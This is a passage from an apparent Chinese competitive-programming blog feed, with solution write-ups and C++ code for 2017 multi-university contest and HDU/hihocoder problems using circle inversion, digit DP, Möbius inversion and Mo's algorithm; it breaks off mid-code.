      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/08/22/2017%E5%A4%9A%E6%A0%A19" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="1002-Ch’s-gift"><a href="#1002-Ch’s-gift" class="headerlink" title="1002.    Ch’s gift"></a>1002.    Ch’s gift</h3><p>首先考虑序列上的问题。</p><p>$a$ 是一个二维数组，如果第 $i$ 位置的值为 $j$，就在 $a_{i,j}$上加上 $j$ 。那么某个询问 $x,y,a,b$ 的答案就是子矩阵的和。如果一开始就把二维前缀和算出来的话就可以回答$O(1)$，答案等于 $(Sum(y,b)-Sum(y,a-1))-(Sum(x,b)-Sum(x,a-1))$ 。</p><p>考虑到 $a,b$ 的范围非常大，可以把所有询问离散化。当然就算离散化，预处理二维前缀和还是不行的，我们发现前缀和相当于把 $[a,b]$ 拆成 $[1,b]-[1,a-1]$，联想到扫描线，把 $a,b$ 这一维的每个区间拆成两条线，用扫描线从小到大扫这一维，$x,y$ 这一维直接预处理一下前缀和每次 $O(1)$ 查就行了。</p><p>再搬到树上，直接套一个树链剖分就行了，树状数组就能维护。</p><p>ps: 可持久化线段树可以在线回答，等写出来了更新</p><h3 id="1005-FFF-at-Valentine"><a href="#1005-FFF-at-Valentine" class="headerlink" title="1005.    FFF at Valentine"></a>1005.    FFF at Valentine</h3><p>强连通缩点加拓扑序判分叉，不多说了。</p><h3 id="1006-Senior-Pan"><a href="#1006-Senior-Pan" class="headerlink" title="1006.    Senior Pan"></a>1006.    Senior Pan</h3><p>这题主要是题意有点不清楚。。。大小为 $k$ 的端点集合，题目的意思是起点终点不能是同一个【不过也是有道理的。。。</p><p>拆点，加超级源超级汇，再跑一下dij 。这个限制可以每个点维护一下被谁松弛过，比如现在想用 $i$ 松弛 $j’$，如果 $j$ 松弛过 $i’$，直接不让松弛就行了。一个点被松弛的次数小于总点数，复杂度也就是多个 $logn$，具体表现可能比20次dij好一点吧。</p><h3 id="1008-Numbers"><a href="#1008-Numbers" class="headerlink" title="1008.    Numbers"></a>1008.    Numbers</h3><p>从小到大取，$O(n^2logm)$，$n$ 是 $\sqrt{m}$ 级别。</p><h3 id="1010-Two-strings"><a href="#1010-Two-strings" class="headerlink" title="1010.    Two strings"></a>1010.    Two strings</h3><p>主要还是题意比较坑。。。匹配<code>.*</code>是要把<code>.</code>先变成某个字符再处理<code>*</code>。。。</p><p>队友(<em>wenwenla</em>)写了一种dp，先预处理pattern，dp[i]保存pattern前i个字符为止可以匹配到text的最左和最右，可以证明这个界里面的每一个都是可取的。</p><p>具体实现加一维表示最左最右，然后发现第一维可以去掉。</p><p><a href="https://github.com/Smlight/ACMer/blob/master/2017/08/22/2017%E5%A4%9A%E6%A0%A19/1010.cpp" target="_blank" rel="noopener">1010.cpp</a></p><p>时间0ms，就是容易写错。。。比赛的时候前面WA的都交上去了，最后一次AC的代码却没交上去[cry]。。。而且我们亲眼看到点了submit以后页面跳转了。。。结果连提交记录都没有？？</p><p>后来有人说了才发现这样直接正则就能过。<del>这题出得真好？？</del></p><p><a href="https://github.com/Smlight/ACMer/blob/master/2017/08/22/2017%E5%A4%9A%E6%A0%A19/1010_regex.cpp" target="_blank" rel="noopener">1010_regex.cpp</a></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 6158 The Designer</title>
      <url>/blog/2017/08/20/hdu6158/</url>
      <content type="html"><![CDATA[<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>比赛之后有大佬说这题可以用圆的反演来做，学习了一下。</p><p>以两个大圆的切点为反演中心，任取一个反演半径，两个大圆会变成两条平行线。再考虑小圆的反演，由于相切的性质不变，小圆的反演圆就是一列夹在平行线中间的小圆。</p><p>示意图：</p><p><img src="http://img.blog.csdn.net/20170820182706028" alt="圆的反演"></p><p>当然这样还是 $O(n)$ 的，但是看题目里的图就知道小圆会越来越小，小到一定程度以后直接不考虑就行了。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#include &lt;bits/stdc++.h&gt;</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="title">std</span>;</div><div class="line"></div><div class="line">typedef <span class="keyword">long</span> <span class="keyword">double</span> ld;</div><div class="line"><span class="keyword">const</span> ld IR2=<span class="number">100</span>;</div><div class="line"><span class="keyword">const</span> ld PI=<span class="number">3.141592653589793238462643383279502884197169399375105820974944592307816</span>L;</div><div class="line"><span class="keyword">struct</span> Point &#123;</div><div class="line">    ld x,y;</div><div class="line">    Point(ld _x=<span class="number">0</span>,ld _y=<span class="number">0</span>):x(_x),y(_y) &#123;&#125;</div><div class="line">    Point <span class="keyword">operator</span> +(<span class="keyword">const</span> Point &amp;R) &#123;</div><div class="line">        <span class="keyword">return</span> Point(R.x+x,R.y+y);</div><div class="line">    &#125;</div><div class="line">    Point <span class="keyword">operator</span> -(<span class="keyword">const</span> Point &amp;R) &#123;</div><div class="line">        <span class="keyword">return</span> Point(R.x-x,R.y-y);</div><div class="line">    &#125;</div><div class="line">    ld <span class="keyword">operator</span> *(<span class="keyword">const</span> Point &amp;R) &#123;</div><div class="line">        <span class="keyword">return</span> R.x*x+R.y*y;</div><div class="line">    &#125;</div><div class="line">    Point <span class="keyword">operator</span> *(<span class="keyword">const</span> ld &amp;R) &#123;</div><div class="line">        <span class="keyword">return</span> Point(x*R,y*R);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">double</span> o1=x,o2=y;</div><div class="line">        cout&lt;&lt;o1&lt;&lt;<span class="string">" "</span>&lt;&lt;o2&lt;&lt;<span class="string">"\n"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> sqr(x) ((x)*(x))</span></div><div class="line"><span class="function">ld <span class="title">inv_circle</span>(<span class="params">Point O,Point C,ld r</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> IR2*r/(sqr(O-C)-sqr(r));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    scanf(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="function">Point <span class="title">O</span>(<span class="params"><span class="number">0</span>,<span class="number">0</span></span>)</span>;</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">double</span> t1,t2;</div><div class="line">        scanf(<span class="string">"%lf%lf"</span>,&amp;t1,&amp;t2);</div><div class="line">        <span class="keyword">if</span> (t1&gt;t2) swap(t1,t2);</div><div class="line">        ld r=t1,R=t2;</div><div class="line">        <span class="keyword">int</span> n;</div><div class="line">        scanf(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="function">Point <span class="title">P</span>(<span class="params"><span class="number">0.5</span>*IR2/R,<span class="number">0</span></span>)</span>;</div><div class="line">        <span class="function">Point <span class="title">Q</span>(<span class="params"><span class="number">0.5</span>*IR2/r,<span class="number">0</span></span>)</span>;</div><div class="line">        ld L=Q.x-P.x;</div><div class="line">        <span class="function">Point <span class="title">o</span>(<span class="params">(P+Q</span>)*0.5)</span>;</div><div class="line">        ld ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">if</span> (n%<span class="number">2</span>==<span class="number">0</span>) &#123;</div><div class="line">            <span class="function">Point <span class="title">C</span>(<span class="params">o.x,o.y+(n/<span class="number">2</span></span>)*L)</span>;</div><div class="line">            ld rr=inv_circle(O,C,L*<span class="number">0.5</span>);</div><div class="line">            ans+=PI*rr*rr;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i+i<span class="number">-1</span>&lt;=n;i++) &#123;</div><div class="line">            <span class="function">Point <span class="title">C</span>(<span class="params">o.x,o.y+(i<span class="number">-1</span></span>)*L)</span>;</div><div class="line">            ld rr=inv_circle(O,C,L*<span class="number">0.5</span>);</div><div class="line">            ld area=PI*rr*rr;</div><div class="line">            <span class="keyword">if</span> (area&lt;<span class="number">1e-12</span>) <span class="keyword">break</span>;</div><div class="line">            ans+=area;</div><div class="line">            <span class="keyword">if</span> (i&gt;<span class="number">1</span>) ans+=area;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">double</span> <span class="keyword">out</span>=ans;</div><div class="line">        printf(<span class="string">"%.5f\n"</span>,<span class="keyword">out</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h3><p>大佬不愿意透露id，鸣谢csust？</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 6156 Palindrome Function</title>
      <url>/blog/2017/08/20/hdu6156/</url>
      <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>定义函数 $f(n,k)$，当 $n$ 在 $k$ 进制表示为回文数时，$f(n,k)=k$；否则 $f(n,k)=1$ 。求 $\sum_{i=L}^{R}\sum_{j=l}^{r}f(i,j)$ 。（$1 \leq T \leq 10^5, 1 \leq L \leq R \leq 10^9, 2 \leq l \leq r \leq 36$）</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>可以发现 $l,r$ 的范围很小，直接枚举 $j$ 代表 $j$ 进制，对于 $i$ 用数位dp统计即可。</p><p>比赛的时候竟然没做这一题。。。蠢死了 ┭┮﹏┭┮ </p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;bits/stdc++.h&gt;</span></div><div class="line">using namespace std;</div><div class="line"></div><div class="line">typedef long long ll;</div><div class="line">const <span class="keyword">int</span> B=<span class="number">40</span>;</div><div class="line"><span class="keyword">int</span> dig[B],tmp[B];</div><div class="line">ll dp[B][B][B];</div><div class="line"><span class="keyword">int</span> base;</div><div class="line"></div><div class="line">ll dfs(<span class="keyword">int</span> <span class="keyword">pos</span>,<span class="keyword">int</span> start,bool limit)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">pos</span>&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (!limit&amp;&amp;dp[base][<span class="keyword">pos</span>][start]!=-<span class="number">1</span>) &#123;</div><div class="line">        <span class="keyword">return</span> dp[base][<span class="keyword">pos</span>][start];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> <span class="keyword">last</span>=limit?dig[<span class="keyword">pos</span>]:base-<span class="number">1</span>;</div><div class="line">    ll res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="keyword">last</span>;i++) &#123;</div><div class="line">        tmp[<span class="keyword">pos</span>]=i;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">pos</span>==start&amp;&amp;i==<span class="number">0</span>) &#123;</div><div class="line">            res+=dfs(<span class="keyword">pos</span>-<span class="number">1</span>,start-<span class="number">1</span>,limit&amp;&amp;(i==<span class="keyword">last</span>));</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">pos</span>&lt;(start+<span class="number">1</span>)/<span class="number">2</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (i==tmp[start-<span class="keyword">pos</span>]) &#123;</div><div class="line">                res+=dfs(<span class="keyword">pos</span>-<span class="number">1</span>,start,limit&amp;&amp;(i==<span class="keyword">last</span>));</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            res+=dfs(<span class="keyword">pos</span>-<span class="number">1</span>,start,limit&amp;&amp;(i==<span class="keyword">last</span>));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!limit) dp[base][<span class="keyword">pos</span>][start]=res;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ll calc(<span class="keyword">int</span> <span class="keyword">x</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (<span class="keyword">x</span>) &#123;</div><div class="line">        dig[len++]=<span class="keyword">x</span>%base;</div><div class="line">        <span class="keyword">x</span>/=base;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> dfs(len-<span class="number">1</span>,len-<span class="number">1</span>,<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> main()</div><div class="line">&#123;</div><div class="line">    memset(dp,-<span class="number">1</span>,sizeof(dp));</div><div class="line">    <span class="keyword">int</span> T,cas=<span class="number">0</span>;</div><div class="line">    scanf(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> L,R,l,r;</div><div class="line">        scanf(<span class="string">"%d%d%d%d"</span>,&amp;L,&amp;R,&amp;l,&amp;r);</div><div class="line">        ll ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (base=l;base&lt;=r;base++) &#123;</div><div class="line">            ll cnt=calc(R)-calc(L-<span class="number">1</span>);</div><div class="line">            ans+=cnt*base+(R-L+<span class="number">1</span>-cnt);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">printf</span>(<span class="string">"Case #%d: %lld\n"</span>,++cas,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017年多校联训8 部分题解</title>
      <url>/blog/2017/08/18/2017-multi8/</url>
      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/08/17/2017%E5%A4%9A%E6%A0%A18" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="1001-Army-Formations"><a href="#1001-Army-Formations" class="headerlink" title="1001.    Army Formations"></a>1001.    Army Formations</h3><p>感觉题意有点绕。。。其实就是每个节点一开始就有整个子树的序列，那么这个序列一定是先输入小的再输入大的才能最优。</p><p>不过这个事情也不是两个有序表合并这么简单，因为对于两个序列，只有把某个序列的数一个一个地插入到另一个才能算出答案。这时候就要用到启发式合并，什么是启发式的策略，通俗来讲就是人脑比较倾向于选择的策略。比如在这里就是把短的序列一个一个插到长的里面，比赛的写的线段树合并结果写了一大坨还没调出来，太蠢了😂。。。然后照着题解写了一个树状数组。。。</p><p>代码见附录，<code>dfs</code>用来得到轻重儿子，<code>solve</code>就是插入和合并，要递归重儿子时直接把轻儿子的全部删掉就行了。</p><h3 id="1002-Battlestation-Operational"><a href="#1002-Battlestation-Operational" class="headerlink" title="1002.    Battlestation Operational"></a>1002.    Battlestation Operational</h3><p>求 $f(n)=\sum_{i=1}^{n}\sum_{j=1}^{i} \left\lceil \frac{i}{j} \right\rceil \left[ (i, j) = 1\right]$ 。</p><p>比赛的时候算是瞎猜了一下。。。其实这题反演的理论性还是很好的。</p><p>以下 $n,i,j,k,d$ 均为正整数，且<strong>用 $(i,j)$ 表示 $i$ 和 $j$ 的最大公约数</strong>。</p><p>记 $h(i)=\sum_{j=1}^{i} \left\lceil \frac{i}{j} \right\rceil \left[ (i, j) = 1\right]$，显然 $f(n)$ 为 $h(i)$ 的前缀和。<br>考虑到 $h(i)$ 中与互质有关，不易直接求解，直接令 $g(i)=\sum_{j=1}^{i} \left\lceil \frac{i}{j} \right\rceil$ 。</p><p>将 $g(i)$ 中的 $\left\lceil \frac{i}{j} \right\rceil$ 按 $(i,j)$ 分类。枚举可能的 $(i,j)=d$，则有 $d|i，j=kd，k\le \frac{i}{d}$ 且 $(i,kd)=d$（注意， $k$ 不是从 $1$ 到 $\frac{i}{d}$ 的全集）。现只对这一类求和：<br>$$ \begin{equation}\begin{split}<br> &amp;\sum_{k=1}^{\frac{i}{d}}\left\lceil \frac{i}{kd} \right\rceil \left[ (i, kd) = d\right] \<br>=&amp; \sum_{k=1}^{\frac{i}{d}}\left\lceil \cfrac{\frac{i}{d}}{k} \right\rceil \left[ (\frac{i}{d}, k) = 1\right] \<br>=&amp;\ h(\frac{i}{d})<br>\end{split}\end{equation}$$<br>当 $d$ 取遍 $i$ 的约数，我们有 $g(i)=\sum_{d|i}h(\frac{i}{d})$。<br>由约数的性质，也即 $g(i)=\sum_{d|i}h(d)$ 。<br>这是标准的莫比乌斯反演形式，可以得到 $h(i)=\sum_{d|i} \mu(d) g(\frac{i}{d})$ 。</p><p>小结一下。</p><p><em>如何求解 $f(n)$：</em>$h(i)$ 的前缀和；</p><p><em>如何求解 $h(i)$：</em>莫比乌斯反演；</p><p><em>如何求解 $\mu(i)$：</em>线性筛模板；</p><p><em>如何求解 $g(i)$：</em>按常规考虑枚举分母（$j$），则对于 $i=j$ 的 $g(i)$ 要+1，对于 $i=j+1…2j$ 的 $g(i)$ 要+2，……，也就是说一个 $j$ 相当于多次区间加法；但是这里不需要动态维护，只需要最终结果，所以利用差分的思想，即 $g’(i)=g(i)-g(i-1)$，回顾上述过程就是对 $g’(i)$ 在 $j,j+1,2j+1…$ 的单点修改，容易很多，最后再对 $g’(i)$ 求和即可。</p><p>鸣谢 <strong>quailty, forever97</strong>！</p><h3 id="1008-Hybrid-Crystals"><a href="#1008-Hybrid-Crystals" class="headerlink" title="1008.    Hybrid Crystals"></a>1008.    Hybrid Crystals</h3><h3 id="1011-Killer-Names"><a href="#1011-Killer-Names" class="headerlink" title="1011.    Killer Names"></a>1011.    Killer Names</h3><p><code>dp[i][j]</code>表示前<code>i</code>个字符恰好用到<code>j</code>种字符的方案数，然后把组合数表和dp表预处理一下，每次 $O(m^2)$ 回答。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hihocoder 1553 区间统计</title>
      <url>/blog/2017/08/17/hihocoder1553/</url>
      <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p><a href="http://hihocoder.com/problemset/problem/1553" target="_blank" rel="noopener">#1553 : 区间统计</a> 中文题。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>首先预处理所有幂次的结果，$O(NK)$；还有IO时间一定要注意。以下均不讨论。</p><p>一看题，无修改区间询问，莫队走起。但是用map复杂度太高了，没算错的话应该是 $O(n^{1.5}logn+m\sqrt{n})$ 。</p><p>考虑到A[]的范围不大，可以对A[]计数，不过没什么卵用。但是对A[]计数以后可以发现，我们不仅可以对值计数还可以对次数计数，也就是说has[i]表示有多少数在当前询问中的<strong>出现次数</strong>等于 i 。</p><p>到这里还是比较容易的，但是如果直接扫has[]复杂度并没有降低 $O(n^{1.5}+mn)$ 。。。</p><p>仍然是考虑分治思想，一次询问最多是整个区间，整个区间中出现次数大于 $\sqrt{n}$ 的数不会超过 $\sqrt{n}$ 个，还可以进行另外的预处理，我就直接<code>multiset</code>暴力了。。。复杂度大概是 $O(n^{1.5}+m\sqrt{n}+(n+m)log{\sqrt{n}})$ 。。。(已经不会算了 _(:△」∠)_ )</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MO=<span class="number">1000000007</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> len;</div><div class="line"><span class="keyword">int</span> po[N][<span class="number">105</span>];</div><div class="line"><span class="keyword">int</span> cnt[N],has[N];</div><div class="line"><span class="keyword">int</span> a[N],anss[M];</div><div class="line"><span class="built_in">multiset</span>&lt;<span class="keyword">int</span>&gt; ss;</div><div class="line"></div><div class="line"><span class="keyword">namespace</span> fastIO &#123;</div><div class="line">    <span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 100000</span></div><div class="line">    <span class="comment">//fread -&gt; read</span></div><div class="line">    <span class="keyword">bool</span> IOerror = <span class="number">0</span>;</div><div class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">char</span> <span class="title">nc</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buf[BUF_SIZE], *p1 = buf + BUF_SIZE, *pend = buf + BUF_SIZE;</div><div class="line">        <span class="keyword">if</span>(p1 == pend) &#123;</div><div class="line">            p1 = buf;</div><div class="line">            pend = buf + fread(buf, <span class="number">1</span>, BUF_SIZE, <span class="built_in">stdin</span>);</div><div class="line">            <span class="keyword">if</span>(pend == p1) &#123;</div><div class="line">                IOerror = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> *p1++;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">blank</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> ch == <span class="string">' '</span> || ch == <span class="string">'\n'</span> || ch == <span class="string">'\r'</span> || ch == <span class="string">'\t'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> &amp;x)</span> </span>&#123;</div><div class="line">        <span class="keyword">char</span> ch;</div><div class="line">        <span class="keyword">while</span>(blank(ch = nc()));</div><div class="line">        <span class="keyword">if</span>(IOerror)</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        <span class="keyword">for</span>(x = ch - <span class="string">'0'</span>; (ch = nc()) &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>; x = x * <span class="number">10</span> + ch - <span class="string">'0'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="meta">#<span class="meta-keyword">undef</span> BUF_SIZE</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> Query &#123;</div><div class="line">    <span class="keyword">int</span> L, R, k, ID, block;</div><div class="line">    Query() &#123;&#125;</div><div class="line">    Query(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k, <span class="keyword">int</span> ID):L(l), R(r), k(k), ID(ID) &#123;</div><div class="line">        block = l / len;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Query &amp;rhs) <span class="keyword">const</span> &#123;</div><div class="line">        <span class="keyword">if</span>(block == rhs.block) <span class="keyword">return</span> R &lt; rhs.R;</div><div class="line">        <span class="keyword">return</span> block &lt; rhs.block;</div><div class="line">    &#125;</div><div class="line">&#125; queries[M];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    --has[cnt[n]];</div><div class="line">    <span class="keyword">if</span> (cnt[n]&gt;len) &#123;</div><div class="line">        ss.erase(ss.find(cnt[n]));</div><div class="line">    &#125;</div><div class="line">    ++cnt[n];</div><div class="line">    ++has[cnt[n]];</div><div class="line">    <span class="keyword">if</span> (cnt[n]&gt;len) &#123;</div><div class="line">        ss.insert(cnt[n]);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">erase</span><span class="params">(<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    --has[cnt[n]];</div><div class="line">    <span class="keyword">if</span> (cnt[n]&gt;len) &#123;</div><div class="line">        